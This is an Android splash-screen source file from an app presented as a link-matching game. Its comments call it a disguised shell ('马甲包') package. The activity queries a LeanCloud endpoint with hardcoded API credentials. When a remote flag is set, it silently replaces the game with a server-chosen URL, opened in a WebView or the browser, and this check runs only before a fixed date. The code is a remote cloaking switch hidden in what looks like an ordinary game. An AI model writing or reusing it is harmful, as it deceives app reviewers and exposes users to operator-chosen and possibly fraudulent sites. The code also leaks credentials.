package swu.xl.linkgame.Activity;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import com.regus.mj.MJRegusActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SplashMainActivity extends Activity {

    //跳转到原马甲包启动页的全路径
    String activityPath = "REGUS_PATH";


    @Override
    protected void onResume() {
        super.onResume();

//        Log.e("zzz", "" + System.currentTimeMillis());
//        Log.e("zzz1", "" + DateTool.getLongFromTime(DateTool.FMT_DATE, "2022-12-5"));
        setData();

    }

    private void setData() {
        if (System.currentTimeMillis() < 1670169600000L) {
            Log.e("zzz2", "" + System.currentTimeMillis());
            new Thread(new GetDtRunnale()).start();
        }
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {

        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(SplashMainActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    private class GetDtRunnale implements Runnable {

        @Override
        public void run() {

            try {
                URL urll = new URL("https://iuezl3up.api.lncldglobal.com/1.1/classes/data/63770a355fee9f4325dcd4ee");
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setRequestProperty("X-LC-Id", "IuEZl3upK7WWyhx90eyaKtag-MdYXbMMI");
                urlConnection.setRequestProperty("X-LC-Key", "27Om3goQARTtUyLVXNPse3pC");
                urlConnection.setConnectTimeout(4000);
                urlConnection.setReadTimeout(4000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    //     Log.e("regus getDt ", jsonStr + "");

                    //处理
                    try {
                        JSONObject avObject = new JSONObject(jsonStr);
                        String page = avObject.getString("page");
                        String url = avObject.getString("uu_rl");
                        boolean isStop = avObject.getBoolean("kg");
                        Log.e("avo", "s  " + isStop + " i  " + url);
                        if (isStop) {
                            if (page.equals("1")) {
                                Intent intent = new Intent(SplashMainActivity.this, WebViewActivity.class);
                                intent.putExtra("wap_url", url);
                                startActivity(intent);
                                finish();
                            } else {
                                Intent intent = new Intent();
                                intent.setAction(Intent.ACTION_VIEW);
                                Uri content_url = Uri.parse(url);
                                intent.setData(content_url);
                                intent.addCategory(Intent.CATEGORY_BROWSABLE);
                                startActivity(intent);
                            }
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } else {
                }
            } catch (Exception e) {
            }
        }

    }

}
